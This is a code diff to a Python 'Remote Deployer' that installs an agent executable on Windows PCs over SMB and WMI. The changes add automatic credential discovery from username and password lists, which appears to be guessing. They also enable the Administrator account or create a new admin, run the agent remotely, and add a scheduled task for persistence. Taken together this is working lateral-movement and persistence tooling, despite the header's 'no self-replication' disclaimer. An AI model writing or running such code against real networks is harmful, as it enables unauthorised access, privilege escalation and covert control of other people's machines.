@@ -1,6 +1,7 @@
 """
 Remote Deployer — Deploys the client agent to Windows PCs via SMB + WMI.
 Only deploys to IPs you explicitly specify. No self-replication.
+Uses smart_connect to automatically find/create admin credentials.
 """
 
 import os
@@ -8,6 +9,10 @@ import subprocess
 import shutil
 import time
 import socket
+
+from smart_connect import smart_connect, find_working_credentials
+
+from smart_connect import smart_connect, find_working_credentials
 
 
 def check_administrator_status(ip, username, password):
@@ -194,44 +199,56 @@ def create_remote_task(ip, username, password, agent_path):
 
 
 def deploy_to_pc(
-    ip, username, password, agent_path, use_psexec=False, admin_password=None
+    ip,
+    username=None,
+    password=None,
+    agent_path=None,
+    use_psexec=False,
+    admin_password=None,
+    custom_usernames=None,
+    custom_passwords=None,
 ):
     """
-    Full deployment to a single PC:
-    0. Check if Administrator is active, enable if needed
-    1. Copy agent .exe
-    2. Run it
-    3. Create scheduled task for persistence
+    Full deployment to a single PC — SMART MODE:
+    0. If no credentials given — auto-find them
+    1. Enable Administrator or create new admin
+    2. Copy agent .exe
+    3. Run it
+    4. Create scheduled task for persistence
     """
     print(f"[*] Deploying to {ip}...")
 
-    # Step 0: Check Administrator status
-    print(f"  [0/4] Checking Administrator account on {ip}...")
-    admin_status = check_administrator_status(ip, username, password)
-    print(f"  [*] Administrator status: {admin_status}")
+    # Step 0: Smart connect — auto-find or create credentials
+    if not username or not password:
+        print(f"  [0/5] Smart connect — auto-finding credentials...")
+        success, deploy_user, deploy_pass, method = smart_connect(
+            ip, custom_usernames, custom_passwords
+        )
+        if not success:
+            print(f"  [-] Could not connect to {ip}")
+            return False, None, None
+        print(f"  [+] Connected via: {method}")
+    else:
+        print(f"  [0/5] Using provided credentials: {username}")
+        deploy_user = username
+        deploy_pass = password
 
-    deploy_user = username
-    deploy_pass = password
+        # Try to enable Administrator anyway
+        from smart_connect import enable_administrator_remote
 
-    if admin_status == "disabled":
-        print(f"  [!] Administrator disabled. Enabling...")
-        enabled, new_pass = enable_administrator_remote(
+        admin_success, admin_user, admin_pass = enable_administrator_remote(
             ip, username, password, admin_password
         )
-        if enabled:
-            print(f"  [+] Administrator enabled! Password: {new_pass}")
-            deploy_user = "Administrator"
-            deploy_pass = new_pass
-        else:
-            print(
-                f"  [-] Failed to enable Administrator. Trying with provided credentials..."
-            )
+        if admin_success:
+            deploy_user = admin_user
+            deploy_pass = admin_pass
+            print(f"  [+] Administrator enabled: {deploy_user}")
 
     # Step 1: Copy agent
     print(f"  [1/4] Copying agent to {ip}...")
     if not copy_agent_to_remote(ip, deploy_user, deploy_pass, agent_path):
         print(f"  [-] Failed to copy agent to {ip}")
-        return False
+        return False, None, None
     print(f"  [+] Agent copied")
 
     # Step 2: Run agent
@@ -243,7 +260,7 @@ def deploy_to_pc(
 
     if not success:
         print(f"  [-] Failed to start agent on {ip}")
-        return False
+        return False, None, None
     print(f"  [+] Agent started")
 
     # Step 3: Create persistence task
